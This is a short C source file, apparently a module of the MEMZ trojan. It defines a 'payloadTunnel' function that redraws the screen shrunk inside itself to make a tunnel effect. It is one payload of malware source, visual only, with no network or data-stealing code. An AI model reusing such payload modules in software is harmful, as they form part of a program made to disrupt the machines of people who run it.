#include "../MEMZ.h"

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 20.0;
}